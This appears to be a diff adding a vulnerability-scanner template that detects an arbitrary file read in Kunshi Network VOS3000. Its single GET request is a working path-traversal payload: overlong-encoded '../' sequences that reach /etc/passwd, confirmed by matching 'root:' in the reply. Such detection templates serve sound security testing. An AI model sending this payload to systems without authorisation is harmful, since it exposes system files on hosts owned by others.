@@ -1,0 +1,29 @@
+id: vos3000-anyfile-read
+info:
+  name: Kunshi Network VOS3000 Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects an arbitrary file read vulnerability in Kunshi Network VOS3000.
+  tags: file-read
+  metadata:
+    finger: vos3000
+
+http:
+  - method: GET
+    path:
+      - "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
